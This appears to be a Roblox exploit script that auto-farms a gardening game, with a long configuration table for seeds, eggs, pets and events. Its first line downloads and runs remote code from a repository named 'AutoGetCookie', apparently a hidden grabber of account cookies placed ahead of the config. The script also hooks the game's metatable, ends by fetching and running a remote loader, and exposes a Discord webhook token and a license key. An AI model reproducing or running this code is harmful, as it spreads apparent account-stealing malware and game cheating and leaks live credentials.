spawn(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ThanhTuoi852123/AutoGetCookie/refs/heads/main/asd33.lua"))()
end)
wait(5)
local Players = game:GetService("Players")

-- Lấy metatable của Player instance
local mt = getrawmetatable(game:GetService("Players"):GetPlayers()[1] or Players.LocalPlayer)
local oldNamecall = mt.__namecall

setreadonly(mt, false)
mt.__namecall = function(self, ...)
    if getnamecallmethod() == "Destroy" and self.Parent == Players then
        print(123)
		return -- chặn xoá player trong game.Players
    end
    return oldNamecall(self, ...)
end
setreadonly(mt, true)
-- Update config : 10/08/2025 v4

-- Update config : 12/08/2025
getgenv().ConfigsKaitun = {
	Beta_Fix_Data_Sync = true,

	NoDeletePlayer = false,

	["Block Pet Gift"] = true,
 
	Collect_Cooldown = 60, -- cooldown to collect fruit
	JustFuckingCollectAll = false, -- Collect all (fruit not wait mutation)

	["Low Cpu"] = true,
	["Auto Rejoin"] = false,

	["Rejoin When Update"] = false,
	["Limit Tree"] = {
		["Limit"] = 200,
		["Destroy Untill"] = 150,

		["Safe Tree"] = {
			"Tranquil Bloom",
			"Maple Apple",
			"Moon Mango",
			"Bone Blossom",
			"Fossilight",
      		        "Serenity",

		}
	},

	Seed = {
		Buy = {
			Mode = "Custom", -- Custom , Auto
			Custom = {
				"Tomato",
				"Strawberry",
				"Bell Pepper",
				"Blood Banana",
				"Onion",
				"Pear",
				"Grape",
				"Mushroom",
				"Pepper",
				"Cacao",
				"Beanstalk",
				"Ember Lily",
				"Sugar Apple",
				"Burning Bud",
				"Giant Pinecone",
				"Elder Strawberry",
			}
		},
		Place = {
			Mode = "Lock", -- Select , Lock
			Select = {
				"Carrot"
			},
			Lock = {
				"Sunflower",
				"Dragon Pepper",
				"Elephant Ears",
				"Moon Melon",
				"Moon Mango",
				"Fossilight",
			}
		}
	},

	["Seed Pack"] = {
		Locked = {

		}
	},

	Events = {
		["Cook Event"] = {
			Minimum_Money = 30_000_000, -- minimum money to start play this event
			Rewards_Item = { "Culinarian Chest", "Gorilla Chef", "Gourmet Egg","Sushi Bear", "Sunny-Side Chicken", "Pet Shard Aromatic", "Cooking Cauldron", "Gourmet Seed Pack", "Bitter Melon Seed", "Pricklefruit Seed", "Butternut Squash Seed", "Spring Onion Seed", "Kitchen Crate", "Kitchen Flooring", "Kitchen Cart", "Smoothie Fountain" }
		},
		["Traveling Shop"] = {
			"Bee Egg",
		},
		Craft = {
			"Anti Bee Egg",
		},
		Shop = {
			"Zen Egg",
			"Zen Seed Pack",
			"Spiked Mango",
			"Pet Shard Tranquil",
			"Pet Shard Corrupted",
			"Koi",
			"Soft Sunshine",
			"Sakura Bush",
			
		},
		Start_Do_Honey = 2_000_000 -- start trade fruit for honey at money
	},

	Gear = {
		Buy = { 
			"Master Sprinkler",
			"Godly Sprinkler",
			"Advanced Sprinkler",
			"Basic Sprinkler",
			"Lightning Rod",
			"Levelup Lollipop",
			"Medium Treat",
			"Medium Toy",
			"Trading Ticket",
		},
		Lock = {
			"Master Sprinkler",
			"Godly Sprinkler",
			"Advanced Sprinkler",
			"Basic Sprinkler",
			"Lightning Rod",
			"Levelup Lollipop",
			"Trading Ticket",
		},
	},

	Eggs = {
		Place = {
			"Gourmet Egg",
			"Zen Egg",
			"Primal Egg",
			"Dinosaur Egg",
			"Oasis Egg",
			"Anti Bee Egg",
			"Night Egg",
			"Bug Egg",
			"Paradise Egg",
			"Bee Egg",
			"Rare Summer Egg",
			"Mythical Egg",
			"Common Summer Egg",
		},
		Buy = {
			"Bee Egg",
			"Oasis Egg",
			"Paradise Egg",
			"Anti Bee Egg",
			"Night Egg",
			"Rare Summer Egg",
			"Bug Egg",
			"Mythical Egg",
			"Common Summer Egg",
			"Common Egg",
		}
	},

	Pets = {
		["Start Delete Pet At"] = 40,
		["Upgrade Slot"] = {
			["Pet"] = {
				["Starfish"] = { 5, 100, 1, true }, -- the "true" on the last is auto equip (use for like only need to use for upgrade pet)
			},
			["Limit Upgrade"] = 5,
			["Equip When Done"] = {
				["Gorilla Chef"] = { 8, 100, 1 },
				["Kodama"] = { 8, 100, 2 },
				["Corrupted Kodama"] = { 8, 100, 2 },
				["Sushi Bear"] = { 8, 100, 2 },
				["Blood Kiwi"] = { 8, 100 },
				["Sunny-Side Chicken"] = { 8, 100 },
				["Bald Eagle"] = { 8, 100 },
				["Rooster"] = { 8, 100 },
				["Chicken"] = { 8, 100 },
				["Cooked Owl"] = { 8, 100 },
				["Kiwi"] = { 8, 100 },
			},
		},
		Favorite_LockedPet = false,
		Locked_Pet_Age = 60, 
		Locked = { ["Sunny-Side Chicken"] = 8, "Junkbot","Sushi Bear", ["Gorilla Chef"] = 8, "Lobster Thermidor", "French Fry Ferret","Corrupted Kitsune","Raiju","Axolotl","Koi","Tanchozuru","Kitsune","Dilophosaurus","Moon Cat","Capybara","Spinosaurus","T-Rex","Brontosaurus","Disco Bee","Butterfly","Queen Bee","Dragonfly","Raccoon","Fennec Fox","Mimic Octopus","Red Fox","Blood Owl","Blood Kiwi","Rooster","Chicken","Cooked Owl","Kiwi", ["Starfish"] = 8, "Seal", "Kodama" },
		LockPet_Weight = 8, 
	},

	Webhook = {
		UrlPet = "https://discord.com/api/webhooks/1389893507812036648/BGNvOWsSuUxM6AyKEEo8H_JDZ7CPrbio8DJ9rxHyEdHZ06bLc9b5088XXXu6k02jBIFB",
		UrlSeed = "xxx",
		PcName = "xxx",

		Noti = {
			Seeds = {
				"Sunflower",
				"Dragon Pepper",
				"Elephant Ears",
			},
			SeedPack = {
				"Idk"
			},
			Pets = { "Lobster Thermidor", "French Fry Ferret", "Corrupted Kitsune", "Kitsune", "Fennec Fox", "Disco Bee", "Raccoon", "Queen Bee", "Dragonfly", "Butterfly", "Mimic Octopus", "T-Rex", "Spinosaurus" },
			Pet_Weight_Noti = true,
		}
	},
}

License = "JxDhMUYIexwxXUBccrfVhgn5ADvdUx4b"
loadstring(game:HttpGet('https://raw.githubusercontent.com/Real-Aya/Loader/main/Init.lua'))()
